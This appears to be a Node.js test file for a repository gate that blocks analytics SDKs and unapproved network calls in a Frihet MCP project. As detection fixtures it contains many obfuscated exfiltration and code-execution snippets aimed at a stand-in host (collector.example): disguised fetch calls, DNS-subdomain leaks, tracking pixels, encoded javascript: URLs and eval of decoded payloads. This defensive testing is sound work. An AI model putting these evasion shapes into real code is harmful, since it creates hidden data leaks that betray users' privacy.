import assert from "node:assert/strict";
import {
  chmodSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, test } from "node:test";

import {
  ANALYTICS_MODULE_PATTERNS,
  APPROVED_BUILT_NETWORK_SINKS,
  APPROVED_DIST_IMPORTS,
  APPROVED_EMBEDDED_RESOURCES,
  APPROVED_LIFECYCLE_SCRIPTS,
  APPROVED_LOCKFILE_HASHES,
  APPROVED_NETWORK_SINKS,
  APPROVED_PACKAGE_DEPENDENCIES,
  APPROVED_PACKAGE_RUNTIME_METADATA,
  APPROVED_PACKAGE_SCRIPT_HASHES,
  APPROVED_PLATFORM_TELEMETRY,
  APPROVED_REVIEW_FILE_HASHES,
  APPROVED_SOURCE_FILE_HASHES,
  APPROVED_STATIC_BINDINGS,
  APPROVED_WORKER_MAINS,
  CODE_EXTENSIONS,
  EMITTER_METHODS,
  EXCLUDED_DIRECTORIES,
  EXTRA_RUNTIME_FILES,
  FORBIDDEN_REPOSITORY_FILES,
  SCAN_ROOTS,
  analyzeCode,
  analyzeManifest,
  compareInventory,
  inspectToml,
  scanBuiltArtifacts,
  scanRepository,
} from "../check-no-analytics-emitters.mjs";

const REPOSITORY_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "../..");
const temporaryRoots = [];

afterEach(() => {
  while (temporaryRoots.length > 0) {
    rmSync(temporaryRoots.pop(), { recursive: true, force: true });
  }
});

function codes(source, file = "fixture.ts") {
  return analyzeCode(file, source).findings.map((finding) => finding.code);
}

function temporaryRoot(prefix = "frihet-analytics-gate-") {
  const root = mkdtempSync(join(tmpdir(), prefix));
  temporaryRoots.push(root);
  return root;
}

describe("anti-defang contract", () => {
  test("pins scan roots, runtime entrypoints, package contracts, and alternatives", () => {
    assert.deepEqual(SCAN_ROOTS, ["src", "workers"]);
    assert.deepEqual(EXTRA_RUNTIME_FILES, ["scripts/postinstall.js"]);
    assert.deepEqual(EXCLUDED_DIRECTORIES, [".git", ".wrangler", "__tests__", "dist", "node_modules"]);
    assert.deepEqual(CODE_EXTENSIONS, [".cjs", ".cts", ".js", ".jsx", ".mjs", ".mts", ".ts", ".tsx"]);
    assert.deepEqual(APPROVED_LIFECYCLE_SCRIPTS, { postinstall: "node scripts/postinstall.js || true" });
    assert.deepEqual(APPROVED_WORKER_MAINS, {
      "workers/api-proxy/wrangler.toml": "worker.js",
      "workers/remote-mcp/wrangler.toml": "src/index.ts",
    });
    assert.equal(APPROVED_PACKAGE_RUNTIME_METADATA["package.json"].type, "module");
    assert.equal(APPROVED_PACKAGE_RUNTIME_METADATA["package.json"].files.includes("scripts/postinstall.js"), true);
    assert.deepEqual(Object.keys(APPROVED_PACKAGE_DEPENDENCIES["package.json"].dependencies), [
      "@modelcontextprotocol/sdk",
    ]);
    assert.match(APPROVED_PACKAGE_SCRIPT_HASHES["package.json"], /^[a-f0-9]{64}$/u);
    assert.deepEqual(FORBIDDEN_REPOSITORY_FILES, [
      ".npmrc",
      "npm-shrinkwrap.json",
      "workers/remote-mcp/.npmrc",
      "workers/remote-mcp/npm-shrinkwrap.json",
      "workers/api-proxy/wrangler.json",
      "workers/api-proxy/wrangler.jsonc",
      "workers/remote-mcp/wrangler.json",
      "workers/remote-mcp/wrangler.jsonc",
    ]);
  });

  test("release and Worker deploy entrypoints cannot bypass the gate", () => {
    const rootScripts = JSON.parse(readFileSync(join(REPOSITORY_ROOT, "package.json"), "utf8")).scripts;
    const workerScripts = JSON.parse(
      readFileSync(join(REPOSITORY_ROOT, "workers/remote-mcp/package.json"), "utf8"),
    ).scripts;
    assert.equal(
      rootScripts["gate:analytics"],
      "node --test scripts/__tests__/analytics-tripwire.test.mjs && node scripts/check-no-analytics-emitters.mjs",
    );
    assert.equal(
      rootScripts.prepublishOnly,
      "node scripts/assert-publish-anchor.mjs && npm run gate:analytics && npm run build && npm run gate:agent-onboarding && npm run gate:public-capability-truth && npm run audit:mcp-refs -- --repo frihet-mcp && npm run gate:no-legacy-region && node scripts/check-no-analytics-emitters.mjs --built",
    );
    assert.equal(
      workerScripts.deploy,
      "npm --prefix ../.. run gate:analytics && wrangler deploy",
    );
  });

  test("pins providers, methods, authorities, source closure, locks, and platform telemetry", () => {
    assert.equal(ANALYTICS_MODULE_PATTERNS.length, 15);
    for (const moduleName of [
      "@amplitude/analytics-node",
      "@google-analytics/data",
      "@opentelemetry/exporter-trace-otlp-http",
      "@posthog/core",
      "@rudderstack/analytics-js",
      "@segment/analytics-next",
      "@vercel/analytics",
      "analytics-node",
      "heap-js",
      "mixpanel-browser",
      "plausible-tracker",
      "posthog-js",
      "react-ga4",
      "rudder-sdk-js",
    ]) {
      assert.ok(ANALYTICS_MODULE_PATTERNS.some((pattern) => pattern.test(moduleName)), moduleName);
    }
    assert.equal(ANALYTICS_MODULE_PATTERNS.some((pattern) => pattern.test("@modelcontextprotocol/sdk")), false);
    assert.deepEqual(EMITTER_METHODS, [
      "alias",
      "capture",
      "captureException",
      "group",
      "identify",
      "opt_in_capturing",
      "opt_out_capturing",
      "page",
      "people.set",
      "register",
      "screen",
      "startSessionRecording",
      "stopSessionRecording",
      "track",
      "unregister",
    ]);
    assert.equal(Object.keys(APPROVED_STATIC_BINDINGS).length, 11);
    assert.equal(Object.keys(APPROVED_SOURCE_FILE_HASHES).length, 13);
    assert.equal(Object.values(APPROVED_SOURCE_FILE_HASHES).every((hash) => /^[a-f0-9]{64}$/u.test(hash)), true);
    for (const sink of Object.keys(APPROVED_NETWORK_SINKS)) {
      const owner = sink.split("|")[0].split("#")[0];
      assert.equal(
        Object.hasOwn(APPROVED_SOURCE_FILE_HASHES, owner),
        true,
        `${owner} must be frozen with a complete reviewed source hash`,
      );
    }
    assert.deepEqual(Object.keys(APPROVED_LOCKFILE_HASHES).sort(), [
      "package-lock.json",
      "workers/remote-mcp/package-lock.json",
    ]);
    assert.deepEqual(APPROVED_PLATFORM_TELEMETRY, {
      "workers/remote-mcp/wrangler.toml|cloudflare-observability": "enabled",
    });
    assert.deepEqual(APPROVED_DIST_IMPORTS, {
      "workers/remote-mcp/scripts/capture-openai-review.mjs": [
        "../../../dist/openai-review-contract.js",
      ],
    });
    assert.deepEqual(Object.keys(APPROVED_REVIEW_FILE_HASHES).sort(), [
      "marketplace/openai/SUBMISSION.md",
      "marketplace/openai/chatgpt-app-submission.json",
      "marketplace/openai/chatgpt-app-submission.v1.schema.json",
      "marketplace/openai/frihet-composer-dark.png",
      "marketplace/openai/frihet-composer.png",
      "marketplace/openai/frihet-directory-dark.png",
      "src/__tests__/fixtures/openai-review-descriptor.snapshot.json",
      "src/__tests__/fixtures/public-capability-contract.json",
      "workers/remote-mcp/public-openai/releases.json",
    ]);
  });

  test("pins exact source, built, navigation, and resource inventories", () => {
    assert.equal(Object.values(APPROVED_NETWORK_SINKS).reduce((sum, count) => sum + count, 0), 24);
    assert.deepEqual(APPROVED_NETWORK_SINKS, {
      "src/client.ts|request|fetch|url.toString()": 1,
      "src/client.ts|fetchRaw|fetch|url.toString()": 1,
      "src/observability.ts|sendBatch|fetch|`${config.baseUrl}/api/public/ingestion`": 1,
      "workers/api-proxy/worker.js|fetch|fetch|upstream.toString()": 2,
      "workers/remote-mcp/src/index.ts|fetch|env.ASSETS.fetch|assetReq": 2,
      "workers/remote-mcp/src/index.ts|fetch|fetch|UPSTREAM_HEALTH": 1,
      "workers/remote-mcp/src/index.ts|fetch|selectedProvider.fetch|providerRequest": 1,
      "workers/remote-mcp/src/index.ts|fetch|Response.redirect|\"https://frihet.io/favicon.ico\"": 1,
      "workers/remote-mcp/src/mcp-session-binding.ts|fetch|unboundHandler.fetch|sdkRequest": 1,
      "workers/remote-mcp/src/oauth-provisioning.ts|provisionOAuthApiKey|fetchImpl|provisioningUrl": 1,
      "workers/remote-mcp/src/oauth-provisioning.ts|revokeOAuthApiKey|fetchImpl|provisioningUrl": 1,
      "workers/remote-mcp/src/oauth-state-store.ts|consumeOAuthState|stateStub(namespace,stateKey).fetch|`${INTERNAL_ORIGIN}/consume`": 1,
      "workers/remote-mcp/src/oauth-state-store.ts|storeOAuthState|stateStub(namespace,stateKey).fetch|`${INTERNAL_ORIGIN}/state`": 1,
      "workers/remote-mcp/src/oauth-token-family.ts|beginOAuthTokenFamilyUse|(awaittokenFamilyStub(namespace,userId,grantId)).fetch|`${INTERNAL_ORIGIN}/token-family/begin`": 1,
      "workers/remote-mcp/src/oauth-token-family.ts|checkOAuthTokenFamilyUse|(awaittokenFamilyStub(namespace,userId,grantId)).fetch|`${INTERNAL_ORIGIN}/token-family/check`": 1,
      "workers/remote-mcp/src/oauth-token-family.ts|commitOAuthTokenFamilyUse|(awaittokenFamilyStub(namespace,userId,grantId)).fetch|`${INTERNAL_ORIGIN}/token-family/commit`": 1,
      "workers/remote-mcp/src/oauth-token-family.ts|initializeOAuthTokenFamily|(awaittokenFamilyStub(namespace,userId,grantId)).fetch|`${INTERNAL_ORIGIN}/token-family`": 1,
      "workers/remote-mcp/src/oauth-token-family.ts|revokeOAuthTokenFamily|(awaittokenFamilyStub(namespace,userId,grantId)).fetch|`${INTERNAL_ORIGIN}/token-family/revoke`": 1,
      "workers/remote-mcp/src/login-page.ts#inline-script|signIn|fetch|\"/callback\"": 1,
      "workers/remote-mcp/src/login-page.ts#inline-script|signIn|window.location.href|data.redirectTo": 1,
      "workers/remote-mcp/src/login-page.ts#inline-script|signInWithEmail|fetch|\"/callback\"": 1,
      "workers/remote-mcp/src/login-page.ts#inline-script|signInWithEmail|window.location.href|data.redirectTo": 1,
    });
    assert.deepEqual(APPROVED_BUILT_NETWORK_SINKS, {
      "dist/client.js|request|fetch|url.toString()": 1,
      "dist/client.js|fetchRaw|fetch|url.toString()": 1,
      "dist/observability.js|sendBatch|fetch|`${config.baseUrl}/api/public/ingestion`": 1,
    });
    assert.equal(Object.values(APPROVED_EMBEDDED_RESOURCES).reduce((sum, count) => sum + count, 0), 2);
  });
});

describe("truthful disclosure remains legal", () => {
  test("allows disclosure prose, identifiers, types, official privacy URLs, and inert comments", () => {
    assert.deepEqual(codes(`
      interface AnalyticsConfig { enabled: boolean }
      const POSTHOG_PRIVACY_NOTICE = "PostHog is a downstream ERP processor.";
      const POSTHOG_ENABLED_DISCLOSURE = "PostHog analytics is enabled only downstream.";
      const ANALYTICS_PRIVACY_URL_COPY = "See https://posthog.com/privacy";
      const html = \`<a href="https://posthog.com/privacy">PostHog privacy</a>\`;
      const example = \`<!-- <img src="https://collector.example/p"> -->\`;
    `), []);
    assert.deepEqual(analyzeCode("fixture.ts", `const example = \`<!-- <img src="https://collector.example/p"> -->\`;`).resources, []);
  });

  test("allows disclosure prose and official privacy links in JSON assets", () => {
    assert.deepEqual(analyzeManifest("fixture/package.json", JSON.stringify({
      name: "fixture",
      description: "Discloses PostHog as a downstream processor.",
      privacyUrl: "https://posthog.com/privacy",
      posthog: "processor disclosure only",
      dependencies: {},
    })), []);
  });

  test("recognizes the reviewed Langfuse sink spelling", () => {
    const result = analyzeCode("src/observability.ts", `
      async function sendBatch(config, batch) {
        return fetch(\`\${config.baseUrl}/api/public/ingestion\`, { method: "POST", body: batch });
      }
    `);
    const expected = "src/observability.ts|sendBatch|fetch|`${config.baseUrl}/api/public/ingestion`";
    assert.deepEqual(result.findings, []);
    assert.deepEqual(result.sinks, [expected]);
    assert.deepEqual(compareInventory(result.sinks, { [expected]: 1 }, "NETWORK_SINK_DRIFT"), []);
  });
});

describe("executable analytics shapes fail closed", () => {
  test("rejects SDK imports, construction, aliases, tarballs, and nested lock records", () => {
    const sdk = codes(`import { PostHog } from "posthog-node"; new PostHog("key");`);
    assert.ok(sdk.includes("ANALYTICS_SDK_IMPORT"));
    assert.ok(sdk.includes("ANALYTICS_EMITTER"));
    for (const manifest of [
      { dependencies: { stats: "npm:posthog-node@1" } },
      { dependencies: { stats: "https://example.test/posthog-node.tgz" } },
      { packages: { "node_modules/wrapper/node_modules/posthog-node": {} } },
      { packages: { "node_modules/stats": { name: "posthog-node" } } },
      { packages: { "node_modules/stats": { resolved: "https://example.test/posthog-node.tgz" } } },
    ]) {
      assert.ok(analyzeManifest("fixture/package-lock.json", JSON.stringify(manifest))
        .some((finding) => finding.code === "ANALYTICS_SDK_DEPENDENCY"));
    }
  });

  test("constant-folds provider modules, hosts, globals, and config keys", () => {
    assert.ok(codes(`const m = ["post", "hog-node"].join(""); await import(m);`).includes("ANALYTICS_SDK_IMPORT"));
    assert.ok(codes(`const p="post"+"hog"; fetch(\`https://eu.i.\${p}.com/capture\`);`).includes("ANALYTICS_ENDPOINT"));
    assert.ok(codes(`globalThis["post"+"hog"].capture("event");`).includes("ANALYTICS_CODE_TOKEN"));
    for (const source of [
      `const key = env["POST" + "HOG_KEY"];`,
      `const key = env["POST".concat("HOG_KEY")];`,
      `const { ["POST" + "HOG_KEY"]: key } = env;`,
      `Reflect.get(env, "ANALYTICS_KEY");`,
      `const config = { ["PH_" + "PROJECT_API_KEY"]: secret };`,
    ]) {
      assert.ok(codes(source).includes("ANALYTICS_CONFIG"), source);
    }
  });

  test("tracks emitter aliases, assignments, computed methods, and bind", () => {
    for (const source of [
      `const analytics=setup(); const emit=analytics.capture.bind(analytics); emit("e");`,
      `posthog["cap"+"ture"]("e");`,
      `const { capture } = posthog; capture("e");`,
      `let emit; emit = posthog.capture; emit("e");`,
    ]) {
      assert.ok(codes(source).includes("ANALYTICS_EMITTER"), source);
    }
  });

  test("detects direct, computed, CommonJS, call/apply, tagged, and escaped network primitives", () => {
    for (const source of [
      `globalThis["fe"+"tch"]("https://collector.example/e");`,
      `const send=globalThis["fe".concat("tch")]; send("https://collector.example/e");`,
      `const send=Reflect.get(globalThis,dynamicKey); send("https://collector.example/e");`,
      `fetchLater("https://collector.example/e", { body: data });`,
      `globalThis.fetchLater("https://collector.example/e", { body: data });`,
      `const {fetchLater:send}=globalThis; send("https://collector.example/e");`,
      `fetch.call(globalThis, "https://collector.example/e");`,
      `Reflect.apply(fetch, globalThis, ["https://collector.example/e"]);`,
      `(0, fetch)("https://collector.example/e");`,
      `[fetch][0]("https://collector.example/e");`,
      `Reflect.get(globalThis,"fetch")("https://collector.example/e");`,
      "fetch`https://collector.example/e`;",
      `const send=require("got"); send("https://collector.example/e");`,
      `const {request:send}=require("undici"); send("https://collector.example/e");`,
      `import * as http2 from "node:http2"; http2.connect("https://collector.example");`,
      `import {resolve as lookup} from "node:dns"; lookup(data+".collector.example", cb);`,
      `import * as dns from "node:dns"; dns.resolve(data+".collector.example", cb);`,
      `invoke(fetch, "https://collector.example/e");`,
      `const x=[fetch];`,
      `const tx={send:fetch};`,
      `tx.send=fetch;`,
      `function go(send=fetch){send(url)} go();`,
      `open(url);`,
      `importScripts(url);`,
      `new Audio(url);`,
      `navigator.serviceWorker.register(url);`,
      `const sw=navigator.serviceWorker; sw.register(url);`,
      `new WebTransport(url);`,
      `new Worker(url);`,
      `const {sendBeacon:send}=navigator; send(url);`,
    ]) {
      const result = analyzeCode("fixture.ts", source);
      assert.ok(result.sinks.length > 0 || result.findings.some((finding) => finding.code === "NETWORK_PRIMITIVE_ESCAPE"), source);
    }
  });

  test("rejects dynamic loaders, eval aliases, timers, WASM, and execution modules", () => {
    for (const source of [
      `await import(moduleName);`,
      `require(moduleName);`,
      `import("data:text/javascript,fetch('/e')");`,
      `const execute=eval; execute(payload);`,
      `const x=[eval];`,
      `Reflect.apply(eval, globalThis, [payload]);`,
      `globalThis.setTimeout("fetch('/e')",0);`,
      `window.setTimeout(atob(encoded),0);`,
      `const code=atob(encoded); const later=setTimeout; later(code,0);`,
      `setTimeout.call(window,atob(encoded),0);`,
      `Reflect.apply(setInterval,window,[atob(encoded),0]);`,
      `WebAssembly.instantiate(payload);`,
      `const W=WebAssembly; W.instantiate(payload);`,
      `new WebAssembly.Module(payload);`,
      `new globalThis.Function(payload)();`,
      `globalThis.constructor.constructor(payload)();`,
      `(()=>{}).constructor(payload)();`,
      `import {exec} from "node:child_process"; exec(payload);`,
      `import {createRequire as make} from "node:module";`,
      `process.getBuiltinModule("node:http").request(target);`,
      `const load=module.require.bind(module); load(moduleName);`,
    ]) {
      assert.ok(codes(source).includes("DYNAMIC_EXECUTION"), source);
    }
  });

  test("rejects mutation of global network primitives", () => {
    for (const source of [
      `globalThis.fetch ||= wrapper;`,
      `self.fetchLater = wrapper;`,
      `globalThis.XMLHttpRequest = wrapper;`,
      `Object.assign(globalThis,{fetch:wrapper});`,
      `Object.defineProperties(globalThis,{fetch:{value:wrapper}});`,
      `Reflect.set(globalThis,"fetch",wrapper);`,
    ]) {
      assert.ok(codes(source).includes("NETWORK_MUTATION"), source);
    }
  });

  test("finds quote-aware, entity-decoded, concatenated, base, pixel, and srcdoc HTML", () => {
    for (const source of [
      `const html=\`<img src=https://collector.example/p>\`;`,
      `const html=\`<img srcset="https://collector.example/a 1x, https://collector.example/b 2x">\`;`,
      `const html=\`<base href="https://collector.example/"><script>fetch("/callback")</script>\`;`,
      `const html="<img "+"src=\\\"https://collector.example/p\\\">";`,
      `const html=["<img ","src=\\\"https://collector.example/p\\\">"].join("");`,
      `const html=\`<a ping="https://collector.example/p">go</a>\`;`,
      `const html=\`<video poster="https://collector.example/p.jpg"></video>\`;`,
      `const html=\`<img alt=">" src="https://collector.example/p">\`;`,
      `const html=\`<script data-x=">//">fetch("https://collector.example/e")</script>\`;`,
      `const html=\`<script data-x='type="application/json"'>fetch("https://collector.example/e")</script>\`;`,
      `const html=\`<script>// </script-x>\\nfetch("https://collector.example/e")</script>\`;`,
      `const html=\`<a href="java&#115cript:fetch(&quot;https://collector.example/e&quot;)">go</a>\`;`,
      `const html=\`<a href="javascript&colon;fetch(&quot;https://collector.example/e&quot;)">go</a>\`;`,
      `const html=\`<iframe srcdoc="&lt;script&gt;fetch(&quot;https://collector.example/e&quot;)&lt;/script&gt;"></iframe>\`;`,
      `const html=\`<meta http-equiv="ref&#114;esh" content="0;url=https://collector.example/e">\`;`,
      `const html=\`<use href="https://collector.example/s.svg#p"></use>\`;`,
      `const html=\`<style>.pixel{background-image:image-set("https://collector.example/p" 1x)}</style>\`;`,
    ]) {
      const result = analyzeCode("fixture.ts", source);
      assert.ok(result.resources.length > 0 || result.sinks.length > 0, source);
    }
    for (const source of [
      `element.innerHTML=payload;`,
      `element.outerHTML=payload;`,
      `element.insertAdjacentHTML("beforeend",payload);`,
      `document.write(payload);`,
      `new DOMParser().parseFromString(payload,"text/html");`,
      `range.createContextualFragment(payload);`,
      `element.setAttribute(name,payload);`,
      `element.setAttribute("src",payload);`,
    ]) {
      assert.ok(analyzeCode("fixture.ts", source).resources.length > 0, source);
    }
  });

  test("finds JSX, React factories, style URLs, srcDoc, spreads, and DOM construction", () => {
    for (const [file, source] of [
      ["fixture.tsx", `const x=<img src="https://collector.example/p"/>;`],
      ["fixture.tsx", `const x=<script src={endpoint}/>;`],
      ["fixture.tsx", `const x=<Image src={endpoint}/>;`],
      ["fixture.tsx", `const x=<track {...props}/>;`],
      ["fixture.tsx", `const x=<a href={"javascript:fetch('/e')"}/>;`],
      ["fixture.tsx", `const x=<meta httpEquiv="refresh" content="0;url=https://collector.example"/>;`],
      ["fixture.tsx", `const x=<div style={{backgroundImage:"url(https://collector.example/p)"}}/>;`],
      ["fixture.tsx", `const x=<iframe srcDoc="&lt;script&gt;fetch('/e')&lt;/script&gt;"/>;`],
      ["fixture.ts", `const R=React; R.createElement("img",{src:endpoint});`],
      ["fixture.ts", `const s=document.createElement("script"); s.src=endpoint;`],
    ]) {
      const result = analyzeCode(file, source);
      assert.ok(result.resources.length > 0 || result.sinks.length > 0, source);
    }
  });

  test("freezes provider-neutral sinks, redirects, Location headers, and cache fetches", () => {
    for (const source of [
      `fetch("https://collector.example/events",{method:"POST"});`,
      `Response.redirect("https://collector.example/");`,
      `const go=Response.redirect; go(target);`,
      `const {redirect:go}=Response; go(target);`,
      `c.redirect(target);`,
      `document.location=target;`,
      `document.location.assign(target);`,
      `const go=document.location.replace; go(target);`,
      `window.location.href=target;`,
      `new Response(null,{headers:{Location:target}});`,
      `headers.set("Location",target);`,
      `const cache=await caches.open("x"); cache.add(url);`,
      `caches.open("x").then(c=>c.add(url));`,
    ]) {
      const result = analyzeCode("fixture.ts", source);
      assert.ok(result.sinks.length > 0, source);
      assert.ok(compareInventory(result.sinks, {}, "NETWORK_SINK_DRIFT").length > 0, source);
    }
  });

  test("rejects parse failures, excluded imports, package/Worker drift, and unknown executables", () => {
    assert.ok(codes(`const = ;`).includes("PARSE_ERROR"));
    assert.ok(codes(`import x from "./coverage/emitter.js";`).includes("TEST_CODE_IMPORT"));
    assert.ok(analyzeManifest("package.json", JSON.stringify({ scripts: { build: "node scripts/evil.js" } }))
      .some((finding) => finding.code === "PACKAGE_SCRIPT_DRIFT"));
    assert.ok(analyzeManifest("package.json", JSON.stringify({ main: "scripts/evil.js" }))
      .some((finding) => finding.code === "RUNTIME_ENTRYPOINT_DRIFT"));
    assert.ok(analyzeManifest("package.json", JSON.stringify({ dependencies: { stats: "1.0.0" } }))
      .some((finding) => finding.code === "DEPENDENCY_INVENTORY_DRIFT"));
    assert.ok(inspectToml("workers/api-proxy/wrangler.toml", 'name="x"\nmain="dist/evil.js"\n')
      .some((finding) => finding.code === "WORKER_ENTRYPOINT_DRIFT"));

    const root = temporaryRoot();
    mkdirSync(join(root, "src"));
    mkdirSync(join(root, "workers"));
    mkdirSync(join(root, "scripts"));
    writeFileSync(join(root, "scripts", "postinstall.js"), 'import "posthog-node";\n');
    writeFileSync(join(root, "package.json"), '{}\n');
    writeFileSync(join(root, "package-lock.json"), '{}\n');
    const executable = join(root, "workers", "payload.bin");
    writeFileSync(executable, "#!/bin/sh\nexit 0\n");
    chmodSync(executable, 0o755);
    const result = scanRepository(root);
    assert.ok(result.findings.some((finding) => finding.code === "ANALYTICS_SDK_IMPORT"));
    assert.ok(result.findings.some((finding) => finding.code === "UNSUPPORTED_FILE"));
  });

  test("permits only the frozen Worker descriptor bridge to import its built contract", () => {
    const bridge = `import { captureOpenAIReviewMcpSurfaceWithRuntime } from "../../../dist/openai-review-contract.js";`;
    assert.equal(
      analyzeCode("workers/remote-mcp/scripts/capture-openai-review.mjs", bridge).findings
        .some((finding) => finding.code === "TEST_CODE_IMPORT"),
      false,
    );
    assert.equal(
      analyzeCode("workers/remote-mcp/scripts/other.mjs", bridge).findings
        .some((finding) => finding.code === "TEST_CODE_IMPORT"),
      true,
    );
    assert.equal(
      analyzeCode(
        "workers/remote-mcp/scripts/capture-openai-review.mjs",
        `import x from "../../../dist/other.js";`,
      ).findings.some((finding) => finding.code === "TEST_CODE_IMPORT"),
      true,
    );
  });

  test("TOML comments are inert while real syntax and telemetry drift fail closed", () => {
    assert.deepEqual(
      inspectToml("fixture.toml", "# it's only a comment with [ and \\\"quotes\\\"\nname = 'safe'\n"),
      [],
    );
    assert.ok(
      inspectToml("fixture.toml", 'name = "unterminated\n')
        .some((finding) => finding.code === "PARSE_ERROR"),
    );
    assert.equal(
      inspectToml(
        "workers/remote-mcp/wrangler.toml",
        'main = "src/index.ts"\n[observability]\nenabled = true\n',
      ).some((finding) => finding.code === "PLATFORM_TELEMETRY_DRIFT"),
      false,
    );
    assert.ok(
      inspectToml(
        "workers/remote-mcp/wrangler.toml",
        'main = "src/index.ts"\n[observability]\nenabled = false\n',
      ).some((finding) => finding.code === "PLATFORM_TELEMETRY_DRIFT"),
    );
  });

  test("scans final built artifacts against a separate exact inventory", () => {
    const root = temporaryRoot();
    mkdirSync(join(root, "dist"));
    writeFileSync(join(root, "dist", "client.js"), `
      async function request(url){ return fetch(url.toString()); }
      async function fetchRaw(url){ return fetch(url.toString()); }
    `);
    writeFileSync(join(root, "dist", "observability.js"), `
      async function sendBatch(config){ return fetch(\`\${config.baseUrl}/api/public/ingestion\`); }
    `);
    const result = scanBuiltArtifacts(root);
    assert.deepEqual(result.findings, []);
    assert.equal(result.sinks.length, 3);
  });

  test("the current source repository satisfies the complete gate", () => {
    const result = scanRepository(REPOSITORY_ROOT);
    assert.deepEqual(result.findings, []);
    assert.equal(result.sinks.length, 24);
    assert.equal(result.resources.length, 2);
  });
});
